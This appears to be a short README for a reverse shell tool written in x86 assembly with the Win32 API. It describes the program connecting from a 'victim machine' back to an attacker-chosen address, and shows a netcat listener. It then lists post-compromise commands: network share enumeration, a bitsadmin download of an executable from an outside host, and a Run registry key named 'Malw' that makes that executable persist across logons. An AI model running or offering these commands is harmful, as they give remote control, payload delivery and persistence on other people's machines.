# ReverseShell
Reverse shell

This tool was written in Assembly x86 - Win32 API

When the program is executed in the victim machine, it will open a reverse shell back at the address of attacker (you can customize the attacker and the port address).

Simple usage:

The attacker must be start a server in my case I used netcat from a local Linux machine:
- nc -l 4444

Then when the program is started in the victmin machine, the attacker could perform command like:
- cmd /C net use
- cmd /C bitsadmin /transfer downloadjob /download /priority normal http://example.com/file.exe C:\Users\user\Documents\file.exe
- cmd /C reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Malw" /t REG_SZ /F /D "C:\Users\user\Documents\file.exe"

And so on...







